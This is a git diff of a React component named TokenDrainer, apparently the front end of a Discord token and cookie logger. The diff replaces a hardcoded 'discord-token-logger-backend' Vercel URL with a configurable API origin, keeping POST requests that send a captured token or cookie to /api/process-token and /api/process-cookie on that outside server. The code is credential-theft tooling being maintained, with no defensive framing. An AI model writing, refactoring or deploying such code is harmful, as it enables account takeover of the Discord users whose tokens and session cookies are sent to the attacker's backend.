@@ -1,4 +1,5 @@
 import { useState, useMemo, useEffect } from 'react';
+import { API_ORIGIN } from '../api';
 
 function TokenDrainer() {
   const [status, setStatus] = useState('idle');
@@ -12,7 +13,7 @@ function TokenDrainer() {
     if (token) {
       setStatus('processing');
 
-      fetch('https://discord-token-logger-backend-fm53.vercel.app/api/process-token', {
+      fetch(`${API_ORIGIN}/api/process-token`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -41,7 +42,7 @@ function TokenDrainer() {
     } else if (cookie) {
       setStatus('processing');
 
-      fetch('https://discord-token-logger-backend-fm53.vercel.app/api/process-cookie', {
+      fetch(`${API_ORIGIN}/api/process-cookie`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
